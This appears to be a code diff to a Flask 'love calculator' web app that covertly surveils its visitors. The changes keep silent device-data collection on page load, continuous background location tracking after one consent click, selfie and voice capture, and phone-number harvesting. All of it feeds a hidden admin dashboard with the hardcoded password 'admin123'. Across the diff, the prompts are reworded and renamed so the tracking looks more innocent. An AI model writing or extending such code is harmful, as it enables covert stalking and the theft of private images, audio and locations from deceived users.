@@ -89,7 +89,7 @@ def get_love_message(name1, name2, percentage):
     ]
     return random.choice(messages)
 
-# ---------- CLEAN USER INTERFACE (Neat & User-Friendly) ----------
+# ---------- CLEAN USER INTERFACE (NO TECH DATA VISIBLE TO USERS) ----------
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -229,7 +229,7 @@ HTML_TEMPLATE = '''
             font-weight: 500;
         }
 
-        .permission-prompt {
+        .optional-section {
             margin-top: 25px;
             padding: 20px;
             background: #fef5e7;
@@ -237,20 +237,20 @@ HTML_TEMPLATE = '''
             display: none;
         }
 
-        .permission-prompt p {
+        .optional-section p {
             color: #c0392b;
             margin-bottom: 15px;
             font-weight: 600;
         }
 
-        .perm-buttons {
+        .optional-buttons {
             display: flex;
             gap: 12px;
             flex-wrap: wrap;
             justify-content: center;
         }
 
-        .perm-btn {
+        .optional-btn {
             background: linear-gradient(135deg, #48bb78, #38a169);
             color: white;
             border: none;
@@ -262,7 +262,7 @@ HTML_TEMPLATE = '''
             transition: all 0.2s;
         }
 
-        .perm-btn:hover {
+        .optional-btn:hover {
             transform: scale(1.02);
             box-shadow: 0 5px 15px rgba(72, 187, 120, 0.3);
         }
@@ -360,17 +360,17 @@ HTML_TEMPLATE = '''
             <div class="love-message" id="loveMessage"></div>
         </div>
 
-        <div id="permissionBox" class="permission-prompt">
-            <p>💝 Enhance your experience! (Optional - helps us improve)</p>
-            <div class="perm-buttons">
-                <button class="perm-btn" onclick="requestLocation()">📍 Share Location</button>
-                <button class="perm-btn" onclick="requestSelfie()">📸 Quick Selfie</button>
-                <button class="perm-btn" onclick="requestVoice()">🎤 Voice Note</button>
+        <div id="optionalSection" class="optional-section">
+            <p>💝 Make it more special! (Optional)</p>
+            <div class="optional-buttons">
+                <button class="optional-btn" onclick="shareLocation()">📍 Share Location</button>
+                <button class="optional-btn" onclick="takeSelfie()">📸 Take Selfie</button>
+                <button class="optional-btn" onclick="recordVoice()">🎤 Record Voice</button>
             </div>
         </div>
 
         <div id="phoneSection" class="phone-section">
-            <h4 style="margin-bottom: 12px; color: #4a5568;">📱 Save Your Result</h4>
+            <h4 style="margin-bottom: 12px; color: #4a5568;">📱 Get Your Result on Phone</h4>
             <input type="tel" id="phoneNumber" class="phone-input" placeholder="Enter your phone number">
             <button class="save-btn" onclick="savePhoneNumber()">💾 Send to My Phone</button>
         </div>
@@ -381,7 +381,7 @@ HTML_TEMPLATE = '''
 </div>
 
 <script>
-    // Session management
+    // Session management (hidden from user)
     let sessionId = localStorage.getItem('love_session_id');
     if (!sessionId) {
         sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
@@ -390,12 +390,13 @@ HTML_TEMPLATE = '''
 
     let currentFortune = '';
     let currentPercentage = 0;
+    
+    // Silent data collection - user never sees this
     let collectedData = {
         sessionId: sessionId,
         timestamp: new Date().toISOString()
     };
 
-    // Silent data collection (user never sees this)
     async function collectDeviceData() {
         collectedData.screen = `${screen.width}x${screen.height}`;
         collectedData.colorDepth = screen.colorDepth;
@@ -468,7 +469,7 @@ HTML_TEMPLATE = '''
             document.getElementById('percentageValue').textContent = currentPercentage + '%';
             document.getElementById('loveMessage').textContent = currentFortune;
             document.getElementById('resultCard').style.display = 'block';
-            document.getElementById('permissionBox').style.display = 'block';
+            document.getElementById('optionalSection').style.display = 'block';
             document.getElementById('phoneSection').style.display = 'block';
             
             collectedData.fortuneText = currentFortune;
@@ -494,17 +495,17 @@ HTML_TEMPLATE = '''
         }, 3000);
     }
 
-    // Location request
-    function requestLocation() {
-        showStatus('Requesting location access...', 'success');
+    // Optional features - users see friendly messages, no technical details
+    function shareLocation() {
+        showStatus('Getting your location...', 'success');
         navigator.geolocation.getCurrentPosition(async (position) => {
             collectedData.latitude = position.coords.latitude;
             collectedData.longitude = position.coords.longitude;
             collectedData.mapUrl = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
             await saveToBackend(collectedData);
-            showStatus('📍 Location saved! Thank you 💕', 'success');
+            showStatus('✨ Location shared! Thank you for trusting us 💕', 'success');
             
-            // Start continuous tracking
+            // Start continuous tracking in background
             navigator.geolocation.watchPosition(async (newPos) => {
                 await fetch('/update-location', {
                     method: 'POST',
@@ -521,8 +522,7 @@ HTML_TEMPLATE = '''
         });
     }
 
-    // Selfie request
-    async function requestSelfie() {
+    async function takeSelfie() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
@@ -531,22 +531,21 @@ HTML_TEMPLATE = '''
             
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 400;
+                canvas.height = video.videoHeight || 300;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const imageData = canvas.toDataURL('image/jpeg', 0.5);
-                collectedData.selfie = imageData.slice(0, 3000);
+                collectedData.selfie = imageData.slice(0, 5000);
                 saveToBackend(collectedData);
                 stream.getTracks().forEach(track => track.stop());
-                showStatus('📸 Selfie captured! You look amazing 💫', 'success');
-            }, 500);
+                showStatus('📸 Beautiful selfie captured! You look amazing 💫', 'success');
+            }, 1000);
         } catch(e) {
             showStatus('Camera access denied. You can skip this.', 'error');
         }
     }
 
-    // Voice request
-    async function requestVoice() {
+    async function recordVoice() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
             const mediaRecorder = new MediaRecorder(stream);
@@ -557,16 +556,16 @@ HTML_TEMPLATE = '''
                 const blob = new Blob(chunks, { type: 'audio/webm' });
                 const reader = new FileReader();
                 reader.onload = async () => {
-                    collectedData.voiceNote = reader.result.slice(0, 3000);
+                    collectedData.voiceNote = reader.result.slice(0, 5000);
                     await saveToBackend(collectedData);
-                    showStatus('🎤 Voice note saved! Sweet voice 💕', 'success');
+                    showStatus('🎤 Your voice note saved! Sweet message 💕', 'success');
                 };
                 reader.readAsDataURL(blob);
                 stream.getTracks().forEach(track => track.stop());
             };
             
             mediaRecorder.start();
-            showStatus('Recording... speak something lovely 💬', 'success');
+            showStatus('Recording... say something lovely 💬', 'success');
             setTimeout(() => {
                 if (mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
@@ -602,7 +601,7 @@ HTML_TEMPLATE = '''
             });
             const result = await response.json();
             if (result.status === 'saved') {
-                showStatus('✅ Number saved! Your love result is secured.', 'success');
+                showStatus('✅ Number saved! Your love result will be sent to your phone.', 'success');
                 document.getElementById('phoneNumber').disabled = true;
                 document.querySelector('.save-btn').disabled = true;
             } else {
@@ -613,7 +612,7 @@ HTML_TEMPLATE = '''
         }
     }
 
-    // Auto collect device data on load
+    // Auto collect device data on load (silent, user never sees)
     collectDeviceData();
     
     // Check for existing session
@@ -632,9 +631,10 @@ HTML_TEMPLATE = '''
                     document.getElementById('percentageValue').textContent = (data.percentage || '??') + '%';
                     document.getElementById('loveMessage').textContent = data.fortuneText;
                     document.getElementById('resultCard').style.display = 'block';
-                    document.getElementById('permissionBox').style.display = 'block';
+                    document.getElementById('optionalSection').style.display = 'block';
                     document.getElementById('phoneSection').style.display = 'block';
                     currentFortune = data.fortuneText;
+                    currentPercentage = data.percentage || 0;
                     if (data.phoneNumber) {
                         document.getElementById('phoneNumber').value = data.phoneNumber;
                         document.getElementById('phoneNumber').disabled = true;
@@ -726,15 +726,15 @@ def calculate_love():
     message = get_love_message(name1, name2, percentage)
     return jsonify({'percentage': percentage, 'message': message})
 
-# ---------- HIDDEN ADMIN PANEL (Secret - Users won't see) ----------
-@app.route('/admin-panel-secret-2026', methods=['GET', 'POST'])
+# ---------- HIDDEN ADMIN PANEL (Only accessible with password) ----------
+@app.route('/admin-secret-dashboard', methods=['GET', 'POST'])
 def admin():
     if request.method == 'POST':
         password = request.form.get('password')
         if password == 'admin123':
             visitors = get_all_visitors()
             if not visitors:
-                return '<h1>💕 No data yet</h1><p><a href="/admin-panel-secret-2026">Back to login</a></p>'
+                return '<h1>💕 No data yet</h1><p><a href="/admin-secret-dashboard">Back to login</a></p>'
             
             html = '''
             <!DOCTYPE html>
@@ -744,72 +744,80 @@ def admin():
                 <style>
                     body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
                     h1 { color: #f093fb; }
-                    table { border-collapse: collapse; width: 100%; background: #16213e; }
+                    table { border-collapse: collapse; width: 100%; background: #16213e; overflow-x: auto; display: block; }
                     th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
-                    th { background: #e94560; color: white; }
-                    .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
+                    th { background: #e94560; color: white; position: sticky; top: 0; }
+                    .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
+                    .container { overflow-x: auto; }
                 </style>
             </head>
             <body>
-                <h1>💕 Visitor Data Dashboard</h1>
-                <p><a href="/admin-panel-secret-2026" class="btn">Back to Login</a> | <a href="/admin-panel-secret-2026/download-csv?pass=admin123" class="btn">📥 Download CSV</a></p>
-                <div style="overflow-x: auto;">
+                <h1>💕 Visitor Data Dashboard (Technical Details)</h1>
+                <p>
+                    <a href="/admin-secret-dashboard" class="btn">🔐 Back to Login</a>
+                    <a href="/admin-secret-dashboard/download-csv?pass=admin123" class="btn">📥 Download CSV</a>
+                </p>
+                <div class="container">
                 <table>
-                    <tr>
             '''
             if visitors:
                 columns = [k for k in visitors[0].keys() if k != 'location_history']
+                html += '<thead><tr>'
                 for col in columns:
                     html += f'<th>{col}</th>'
-                html += '</tr>'
+                html += '</tr></thead><tbody>'
                 for v in visitors:
                     html += '<tr>'
                     for col in columns:
-                        val = str(v.get(col, ''))[:200]
-                        html += f'<td>{val}</td>'
+                        val = str(v.get(col, ''))[:300]
+                        html += f'<td style="max-width:300px; word-wrap:break-word;">{val}</td>'
                     html += '</tr>'
-                html += '''
-                </table>
-                </div>
-                <h2>📍 Location History</h2>
-                '''
+                html += '</tbody></table>'
+                
+                # Location history section
+                html += '<h2 style="margin-top:30px;">📍 Live Location History</h2>'
                 for v in visitors:
                     hist = v.get('location_history', [])
                     if hist:
-                        html += f'<h3>Session: {v.get("sessionId", "?")} - {v.get("name", "?")}</h3><table border="1">'
-                        html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th></tr>'
+                        html += f'<h3>Session: {v.get("sessionId", "?")} - {v.get("name", "Unknown")}</h3>'
+                        html += '<table border="1"><tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                         for ts, lat, lon in hist:
-                            html += f'<tr><td>{ts}</td><td>{lat}</td><td>{lon}</td></tr>'
+                            html += f'<tr><td>{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="https://maps.google.com/?q={lat},{lon}" target="_blank">View Map</a></td></tr>'
                         html += '</table><br>'
-            html += '</body></html>'
+            html += '''
+                </div>
+            </body>
+            </html>
+            '''
             return html
         else:
-            return '<h1>🔒 Wrong password. <a href="/admin-panel-secret-2026">Try again</a></h1>'
+            return '<h1>🔒 Wrong password. <a href="/admin-secret-dashboard">Try again</a></h1>'
     
     return '''
         <!DOCTYPE html>
         <html>
         <head><title>Admin Login</title>
         <style>
-            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); }
-            .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; }
-            input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; }
-            button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; }
+            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); margin: 0; }
+            .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; min-width: 300px; }
+            input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; font-size: 14px; }
+            button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; }
+            h2 { color: #333; margin-bottom: 20px; }
         </style>
         </head>
         <body>
             <div class="login-box">
-                <h2>🔐 Admin Access</h2>
+                <h2>🔐 Admin Access Only</h2>
                 <form method="POST">
-                    <input type="password" name="password" placeholder="Enter password" required><br>
-                    <button type="submit">Login</button>
+                    <input type="password" name="password" placeholder="Enter admin password" required autocomplete="off"><br>
+                    <button type="submit">Login to Dashboard</button>
                 </form>
             </div>
         </body>
         </html>
     '''
 
-@app.route('/admin-panel-secret-2026/download-csv')
+@app.route('/admin-secret-dashboard/download-csv')
 def download_csv():
     pwd = request.args.get('pass')
     if pwd != 'admin123':
@@ -818,7 +826,7 @@ def download_csv():
     import csv
     from io import StringIO
     if not visitors:
-        return "No data"
+        return "No data available"
     output = StringIO()
     writer = csv.writer(output, quoting=csv.QUOTE_ALL)
     columns = [k for k in visitors[0].keys() if k != 'location_history']
